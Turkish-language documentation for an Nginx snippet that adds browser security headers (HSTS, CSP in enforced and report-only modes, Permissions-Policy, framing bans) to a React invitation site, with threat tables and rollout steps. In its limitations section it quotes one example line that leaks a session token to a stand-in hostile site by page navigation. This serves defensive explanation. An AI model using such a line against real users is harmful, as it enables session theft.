# `deploy/nginx/snippets/davetkart-security-headers.conf`

> **Ne işe yarar:** React sitesinin (SPA) her yanıtına tarayıcı güvenlik başlıklarını ekler:
> HSTS, `nosniff`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`, zorlanan küçük bir
> CSP ve **rapor kipinde** tam bir CSP. Sunucuda `/etc/nginx/snippets/davetkart-security-headers.conf`
> olarak durur; `davetkart.conf` onu API dışındaki her `location` bloğunda `include` eder.
> Faz 18.6 · `SEC-04` · K173–K176. Kurulum: [`../install.md`](../install.md). Duman testi:
> [`../../smoke/check-security-headers.md`](../../smoke/check-security-headers.md).

## 1. Hangi saldırıya karşı?

Faz 9'dan beri güvenlik başlıklarını Laravel'in `SecurityHeaders` ara katmanı basıyordu (K85).
Ama ara katman yalnızca **Laravel'in ürettiği** yanıtları görür (`/api/*`). `index.html`, JS, CSS,
görseller ve videolar Laravel'e hiç uğramaz, Nginx onları diskten verir. Denetim (`AUD-2026-11-12`,
`SEC-04`) bu yüzden şunu buldu: sitenin kendisi hiçbir koruma başlığı taşımıyordu.

| Saldırı | Nasıl olur | Bu dosyadaki kilit |
|---|---|---|
| **Clickjacking** | Saldırgan DavetKart'ı kendi sayfasında görünmez bir `<iframe>`'e koyar; kullanıcı "kazan" diye tıkladığında aslında "hesabı sil"e tıklar | `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'` |
| **XSS sonrası token hırsızlığı** | Bir şablonda ya da bağımlılıkta yarın bir XSS çıkar; betik `localStorage`'daki oturum token'ını okuyup dışarı gönderir | CSP (`script-src 'self'`, `connect-src 'self'`, `img-src` listesi): yabancı betik yüklenemez, veri yabancı sunucuya `fetch` / `<img>` ile gidemez |
| **MIME karıştırma** | Yüklenen bir dosya `image/jpeg` diye sunulur ama içinde HTML/JS vardır; tarayıcı "tahmin edip" çalıştırır | `X-Content-Type-Options: nosniff` |
| **HTTPS'ten düşürme** | Kafedeki ağ `http://davetkart.com` isteğini araya girip okur | HSTS: tarayıcı bir kez gördükten sonra bir yıl boyunca yalnızca HTTPS'e gider |
| **Adres sızıntısı** | Misafir davetiyeden dış bir bağlantıya tıklar; `Referer` başlığı davetiyenin adresini (ULID) üçüncü tarafa taşır | `Referrer-Policy: strict-origin-when-cross-origin`: dışarıya yalnızca `https://davetkart.com/` gider |

**Derinlemesine savunma.** Bu başlıkların hiçbiri bir XSS'i *önlemez*; önleme React'in kaçışlaması ve
kodun işidir. Başlıklar, bir hata olduğunda **zararı sınırlayan ikinci kilittir**. Token
`localStorage`'da durduğu sürece (K177) bu ikinci kilit özellikle önemli: `localStorage`'ı sayfadaki
her betik okuyabilir.

## 2. Başlıklar tek tek

| Başlık | Değer | Neden bu değer |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Laravel'in API'de 26 Ekim'den beri gönderdiği değerle **aynı** (Y7.4); iki kaynak farklı şey söylemesin. `includeSubDomains` güvenli, çünkü web'e açık iki alt alan adı da HTTPS: `www` (301) ve `media` (CloudFront). `preload` **yok**: tarayıcıların hazır listesine girmek aylarca geri alınamaz, karar ayrı |
| `X-Content-Type-Options` | `nosniff` | Nginx'in `mime.types` dosyası `.js`'i `application/javascript`, `.css`'i `text/css` diye sunuyor. Yani `nosniff` hiçbir dosyamızı kırmaz, yalnızca yanlış etiketlileri durdurur |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Aynı sitede tam adres (uygulamanın kendi analizi için), dışarıya **yalnızca köken**. `/invite/<ULID>` yolu dışarı çıkmaz. API'nin `no-referrer`'ı daha sıkı; SPA'da onu seçmedik çünkü dış sağlayıcılar (Shopier formu) en azından kökeni görmeyi bekleyebilir. Bu değer zaten modern tarayıcıların varsayılanı; açıkça yazmak eski tarayıcıları da bağlar |
| `X-Frame-Options` | `DENY` | Eski tarayıcılar için çerçeve yasağı. Uygulama kendi sayfasını hiçbir yerde çerçevelemiyor (envanter: tek `<iframe>` OSM haritası, o da **başkasını** çerçeveliyor), bu yüzden `SAMEORIGIN` değil `DENY` |
| `Permissions-Policy` | `accelerometer=(self), gyroscope=(self), magnetometer=(), camera=(), microphone=(), geolocation=(), payment=(), usb=(), fullscreen=(self)` | §4. `()` = "kimse kullanamaz", `(self)` = "yalnızca bizim sayfamız" (içine gömülen yabancı çerçeve değil) |
| `Content-Security-Policy` (zorlanan) | `frame-ancestors 'none'; base-uri 'self'; object-src 'none'` | §3 |
| `Content-Security-Policy-Report-Only` | tam politika | §3 ve §5 |

Her satırın sonundaki `always`: Nginx `add_header`'ı varsayılan olarak yalnızca 200, 204, 301, 302, 304
gibi "başarılı" yanıtlara ekler. `always` olmadan 404 sayfası başlıksız çıkardı; bir hata sayfası da
çerçevelenebilir.

## 3. Neden iki CSP başlığı?

Tarayıcı bir yanıttaki her CSP'yi **ayrı ayrı** uygular. Bir kaynağın yüklenmesi için hepsinin izin
vermesi gerekir. Rapor kipindeki politika (`-Report-Only`) hiçbir şeyi engellemez; yalnızca "bunu
engellerdim" diye konsola yazar.

| Başlık | İçerik | Kip | Neden |
|---|---|---|---|
| `Content-Security-Policy` | `frame-ancestors 'none'; base-uri 'self'; object-src 'none'` | **zorlanır** | Bu üç yönerge hiçbir kaynak yüklemeyi kısıtlamaz, bu yüzden kıracağı bir şey yok. Clickjacking'i (`frame-ancestors`) **bugün** kapatır, `<base href>` ile göreli adresleri saldırgana çevirmeyi ve Flash/eklenti (`<object>`) yüklemeyi yasaklar |
| `Content-Security-Policy-Report-Only` | `default-src 'self'; script-src 'self'; …` (tam liste dosyada) | **rapor** | Asıl kilit. Ama yanlış yazılmış tek bir yönerge sitenin bir parçasını sessizce kırar (§5'teki örnek). Önce gözlenir, sonra zorlanır (K175) |

**`frame-ancestors` neden rapor kipinde yok?** Tarayıcılar `frame-ancestors`'ı `-Report-Only`'de **yok
sayar** ve konsola uyarı yazar. Çerçeve yasağı ancak zorlanan politikada çalışır; zaten orada.

Tam politikanın yönergeleri ve dayandığı envanter (Faz 18.6'da `src/` ve `index.html` tarandı):

| Yönerge | Değer | Kim kullanıyor |
|---|---|---|
| `default-src` | `'self'` | Aşağıda ayrıca yazılmayan her tür (betik çalışanları, manifest…) yalnızca kendi kökenimizden |
| `script-src` | `'self'` | Derleme çıktısında **satır içi betik yok** (`dist/index.html` yalnızca `<script src="/assets/…">`), paketlerde `eval` / `new Function` yok. Bu, CSP'nin en değerli satırı: bir XSS kendi betik dosyasını yükleyemez |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com` | `index.css`'in ilk satırı Google Fonts'u `@import` ediyor (`SEC-12`), beş şablon ailesinin `fontlar.ts`'i çalışma anında `<link>` ekliyor. `'unsafe-inline'`: 11 şablon JSX içinde `<style>` öğesi çiziyor (ör. `DogumGunuMumlar`); onsuz bu şablonların stili düşüyor (yerelde ölçüldü, `style-src-elem inline`) |
| `font-src` | `'self' https://fonts.gstatic.com` | Google Fonts'un yazı tipi dosyaları |
| `img-src` | `'self' data: blob: https://media.davetkart.com` | `data:image/svg+xml` dokular (9 dosya, `index.css`), `blob:` yükleme önizlemeleri (`compressImage.ts`, `useRsvpStore.ts`), galeri ve LCV fotoğrafları CloudFront'tan |
| `media-src` | `'self' blob: https://media.davetkart.com` | `/videos/*` (ana sayfa, şablon arka planları), LCV videoları (`rsvp_video`) |
| `connect-src` | `'self'` | Bütün API çağrıları aynı kökende (`/api`); başka bir yere `fetch` yok |
| `frame-src` | `https://www.openstreetmap.org` | Editördeki konum seçici (`MapPickerModal.tsx`) |
| `object-src` | `'none'` | Eklenti yok |
| `base-uri` | `'self'` | `<base>` yok |
| `form-action` | `'self' https://www.shopier.com` | Ödeme formu Shopier'e POST edilir (`submitProviderForm.ts`) |

## 4. `Permissions-Policy`: hangi sensör, neden

| Özellik | Değer | Gerekçe |
|---|---|---|
| `accelerometer`, `gyroscope` | `(self)` | 3D şablonlar telefon eğildikçe sahneyi döndürüyor (`shared/three/useTilt.ts` → `deviceorientation`, `useDeviceMotion.ts` → `devicemotion`). Chrome bu iki olayı bu iki izne bağlar |
| `magnetometer` | `()` | Yalnızca pusula yönlü `deviceorientationabsolute` için gerekir; kullanılmıyor |
| `fullscreen` | `(self)` | Önizlemedeki cihaz simülatörü tam ekrana geçebiliyor (`DeviceSimulator.tsx`) |
| `camera`, `microphone`, `geolocation`, `payment`, `usb` | `()` | Hiçbiri kullanılmıyor. Konum seçici koordinatı elle alıyor, cihaz konumunu sormuyor. Kapalı olması, bir XSS'in ya da gömülü bir çerçevenin bunları istemesini de engeller |

Listede yalnızca Chrome'un tanıdığı adlar var. Tanımadığı bir ad (ör. eski `interest-cohort`) her
sayfada konsola `Unrecognized feature` hatası yazar; yerel denemede konsol temizdi. Panoya kopyalama
(`navigator.clipboard`) bu politikada ayrıca açılmadı; varsayılanı zaten `self`.

## 5. Rapor kipinden zorlamaya geçiş (K175)

**Neden önce rapor?** Faz 18.6'nın yerel denemesinde denetimin örnek politikası doğrudan zorlandı:
konum seçicinin haritası **boş bir gri kutu** oldu. Örnekte `frame-src` yoktu, `default-src 'self'`
OSM çerçevesini engelledi. Rapor kipinde aynı politika haritayı açık bıraktı ve konsola şunu yazdı:

```
Framing 'https://www.openstreetmap.org/' violates the following report-only Content Security Policy
directive: "default-src 'self'". The violation has been logged, but no further action has been taken.
```

Bu politika yerel denemede **zorlanırken** de temizdi: 12 adım, 0 ihlal (B7 tablosu `FAZ-18.md`
§18.6). Ama deneme şunları göremedi: gerçek medya alan adı (yerelde medya `localhost`'tan gelir),
Shopier'e form gönderimi ve dönüşü (yerelde kart kapalı, Shopier'e istek atılmadı), 373 şablonun
hepsi, iOS Safari. Gözlem haftası bunlar için.

**Geçiş adımları** (ayrı bir değişiklik, ayrı bir K):

1. Bir hafta boyunca ödeme dahil bütün akışları tarayıcıda gez. DevTools → Console'da
   `report-only Content Security Policy` satırlarını ara. Rapor toplayıcı uç **yok** (karar: toplayıcı
   ayrı bir iş); ihlaller yalnızca konsolda görünür.
2. Özellikle bak: **ödeme** (`form-action`; Chrome bu yönergeyi formdan sonraki yönlendirmelere de
   uygular, Shopier başka bir alan adına yönlendirirse burada görünür), **galeri ve LCV fotoğrafları**
   (`media.davetkart.com`), **3D şablonlar** telefonda.
3. Temizse iki başlığı **tek** `Content-Security-Policy` başlığında birleştir (`frame-ancestors 'none'`
   dahil), `-Report-Only` satırını sil. Duman testi iki durumu da kabul eder.
4. `sudo bash deploy/nginx/install.sh` → duman testi → siteyi bir kez daha gez.

## 6. Yeni bir dış kaynak eklerken (şablon yazarı için)

Yeni bir yazı tipi sağlayıcısı, harita, video gömme ya da analitik betiği eklemek **bu dosyayı da
değiştirmek** demektir. Rapor kipinde bir şey kırılmaz ama konsol ihlal yazar; zorlamaya geçtikten
sonra kaynak sessizce engellenir.

| Eklenen | Yönerge |
|---|---|
| `<script src="https://…">` | `script-src`: **önce sor.** Üçüncü taraf betik, sayfadaki token'ı okuyabilir |
| `<iframe src="https://…">` | `frame-src` |
| Yazı tipi CSS'i / dosyası | `style-src` / `font-src` |
| `<img>`, CSS `background-image` | `img-src` |
| `fetch` / `axios` başka bir alan adına | `connect-src` |
| Kamera, konum, mikrofon | `Permissions-Policy`'de `()` → `(self)` |

## 7. Bu dosya neyi korumaz

- **Bir XSS'i önlemez.** Etkisini sınırlar. Kod hâlâ `dangerouslySetInnerHTML` ve `innerHTML`'den
  uzak durmalı.
- **Sayfa değiştirmeyi durdurmaz.** CSP `fetch`'i ve `<img>`'i kısıtlar ama
  `location = 'https://kotu.site/?t=' + token` gibi bir **sayfa geçişini** kısıtlamaz. Token'ı
  betiklerin hiç okuyamayacağı yere (httpOnly çerez) taşımak asıl çözümdür (`SEC-18`, K177).
- **Rapor kipindeyken tam CSP koruma sağlamaz.** O sürede çalışan kilitler zorlanan küçük CSP ve
  diğer başlıklardır.
- **`'unsafe-inline'` stil enjeksiyonunu açık bırakır.** Satır içi `<style>` kullanan 11 şablon hash
  ya da dosyaya taşınırsa kaldırılabilir.
- **`/api` yanıtlarını kapsamaz.** Onları Laravel `SecurityHeaders` basar (K85); sınır §8'de.
- **Nginx'in `server` seviyesinde ürettiği hatalar** (400, 414 gibi bir `location`'a girmeden dönen
  yanıtlar) başlıksız çıkar. İçerikleri Nginx'in sabit hata sayfası; çerçevelenmeleri bir şey
  kazandırmaz.

## 8. API ile sınır: neden `server` seviyesinde değil?

```
davetkart.com/             -> location = /index.html   -> snippet  (Nginx)
davetkart.com/giris        -> try_files -> /index.html  -> snippet  (Nginx)
davetkart.com/assets/x.js  -> location ^~ /assets/      -> snippet  (Nginx)
davetkart.com/favicon.svg  -> location /                -> snippet  (Nginx)
davetkart.com/.env         -> location ~ /\.            -> snippet  (Nginx, 404)
davetkart.com/api/ping     -> location ^~ /api/ -> /index.php -> SecurityHeaders (Laravel)
```

Bir yanıtın başlıklarının **tek bir kaynağı** olur. Snippet `server` seviyesine konsaydı `/api/`
konumları onu miras alırdı (kendi `add_header`'ları yok). API yanıtı her başlığı iki kez taşırdı ve
`Referrer-Policy` çelişirdi (`no-referrer` + `strict-origin-when-cross-origin`; tarayıcı sonuncuyu
uygular, API'ninki zayıflar). Bu düzende yerel denemede ölçüldü (`FAZ-18.md` §18.6, mutant N5).

## 9. Kendin dene

```bash
# sunucuda ya da yerelde, kuruluysa
curl -sI https://davetkart.com/ | grep -iE "strict-transport|content-type-options|referrer|x-frame|permissions|content-security"
```

Tarayıcıda: DevTools → Network → bir isteğe tıkla → **Response Headers**. Console sekmesinde
`report-only` satırları rapor kipinin bulduklarıdır.

Clickjacking'i kendin gör: boş bir `test.html` dosyasına `<iframe src="https://davetkart.com/"></iframe>`
yaz ve tarayıcıda aç. Çerçeve boş kalmalı, konsolda `Refused to display … in a frame because it set
'X-Frame-Options' to 'deny'` ya da `frame-ancestors` iletisi görünmeli.

## 10. Sık hatalar

| Belirti | Sebep |
|---|---|
| Bir sayfada başlıklar var, `/assets/` dosyasında yok | O `location` kendi `add_header`'ını tanımlıyor ve `include` satırı unutulmuş (Nginx'te `add_header` miras alınmaz) |
| `/api/ping` yanıtında `X-Frame-Options` iki kez | Snippet `server` seviyesine konmuş (§8) |
| `nginx -t`: `open() "/etc/nginx/snippets/davetkart-security-headers.conf" failed` | Site dosyası kuruldu, snippet kurulmadı. `install.sh` ikisini birlikte kurar |
| Harita / yazı tipi / ödeme zorlamadan sonra bozuldu | O kaynağın yönergesi eksik; konsoldaki `Refused to …` satırı hangi yönerge olduğunu söyler (§6) |
| Konsolda `Unrecognized feature: '…'` | `Permissions-Policy`'ye Chrome'un tanımadığı bir ad yazılmış |
| Değeri değiştirdim ama tarayıcı eskisini görüyor | `nginx -t` + `reload` yapılmadı ya da `index.html` önbellekte (`no-cache` kuralı) |

## 11. Sözlük

- **CSP (Content Security Policy):** Tarayıcıya "bu sayfa yalnızca şu kaynaklardan betik, stil, görsel… yükleyebilir" diyen başlık.
- **Rapor kipi (`-Report-Only`):** Politika uygulanmaz, yalnızca ihlal raporlanır. Kırmadan ölçmek için.
- **Yönerge (directive):** CSP'nin bir satırı, ör. `img-src`.
- **`'self'`:** Sayfanın kendi kökeni (şema + alan adı + kapı).
- **Clickjacking:** Kullanıcının, görünmez bir çerçevedeki başka bir sitenin düğmesine tıklatılması.
- **HSTS:** "Bu alan adına bir süre yalnızca HTTPS ile gel" talimatı.
- **MIME sniffing:** Tarayıcının dosya türünü `Content-Type`'a değil içeriğe bakarak tahmin etmesi.
- **Derinlemesine savunma:** Tek bir kilide güvenmemek; biri aşılırsa ikincisinin zararı sınırlaması.
